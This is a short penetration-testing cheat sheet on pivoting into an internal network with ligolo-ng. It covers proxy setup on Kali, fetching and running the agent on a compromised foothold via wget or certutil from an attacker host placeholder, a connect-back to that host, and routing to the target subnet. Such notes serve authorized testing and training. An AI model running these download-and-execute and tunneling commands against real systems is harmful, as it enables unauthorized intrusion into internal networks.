## Steps to use ligolo 

Original: https://www.rbtsec.com/blog/tunneling-and-pivoting-using-ligolo-ng/ 

On Kali 

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

Copy files to foothold 

```bash 
wget http://{{LHOST}}/Ligolo/ligolo-ng_agent_0.9_linux_amd64
chmod +x ligolo-ng_agent_0.9_linux_amd64
./ligolo-ng_agent_0.9_linux_amd64 -connect {{LHOST}}:443 -ignore-cert
```

```PowerShell
certutil.exe -urlcache -split -f http://{{LHOST}}/Ligolo/ligolo-ng_agent_0.9_windows_amd64.exe
.\ligolo-ng_agent_0.9_windows_amd64.exe -connect {{LHOST}}:443 -ignore-cert
```

Back on Kali 

```bash
# ligolo >> session
# ligolo >> 1
# ligolo >> start
sudo ip route add {{SUBNET}}/24 dev ligolo

# Ready for nmap or ssh etc. 
sudo ip route del {{SUBNET}}/24
sudo ip link set dev ligolo down
```

Check link if pivoting to multiple subnets. 
